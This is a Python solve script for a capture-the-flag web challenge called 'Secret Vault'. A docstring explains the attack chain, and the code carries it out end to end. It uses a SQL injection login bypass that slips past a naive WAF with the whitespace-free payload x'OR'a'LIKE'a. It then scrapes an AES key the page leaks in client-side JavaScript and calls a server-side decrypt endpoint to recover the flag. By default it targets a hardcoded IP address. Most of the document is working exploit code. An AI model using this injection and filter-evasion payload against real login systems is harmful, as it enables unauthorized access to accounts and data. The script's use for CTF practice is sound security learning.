#!/usr/bin/env python3
"""Secret Vault (WEB, 450) — SQLi login bypass + client-side AES key leak.

Chain:
  1. /login builds  SELECT ... WHERE username='<u>' AND password='<p>'  by
     string concatenation into SQLite (errors leak the shape).
  2. A naive WAF in front of it 403s the literal `' OR '` (quote-space-OR-space)
     plus union/select/--//*//||/N=N. SQLite tokenizes `'OR'` fine with no
     whitespace, so the tautology `x'OR'a'LIKE'a` walks straight past the filter:
        password='x' OR 'a' LIKE 'a'   ->   TRUE  (AND binds tighter than OR)
  3. The vault page ships the AES key for FLAG.txt in client-side JS
     (vaultKey), and offers POST /decrypt {data,key} as an oracle.
"""
import base64, json, re, sys, urllib.request, urllib.parse, http.cookiejar

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8090"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post(path, body, ctype="application/x-www-form-urlencoded"):
    req = urllib.request.Request(BASE + path, data=body.encode(),
                                 headers={"Content-Type": ctype})
    return op.open(req, timeout=15).read().decode()


def get(path):
    return op.open(BASE + path, timeout=15).read().decode()


# 1. Login bypass. Whitespace-free `'OR'` dodges the WAF's `' OR '` pattern.
post("/login", urllib.parse.urlencode({"username": "admin",
                                       "password": "x'OR'a'LIKE'a"}))

# 2. Vault: encrypted FLAG.txt + the AES key the page hands to the browser.
page = get("/vault")
ct = re.search(r"decryptSecret\(\d+,\s*'([^']+)'\)", page).group(1)
key = base64.b64decode(re.search(r'vaultKey\s*=\s*"([^"]+)"',
                                 page).group(1)).decode()

# 3. Server-side decrypt oracle does the AES for us.
res = json.loads(post("/decrypt", json.dumps({"data": ct, "key": key}),
                      "application/json"))
print("[+] FLAG:", res.get("decrypted") or res)
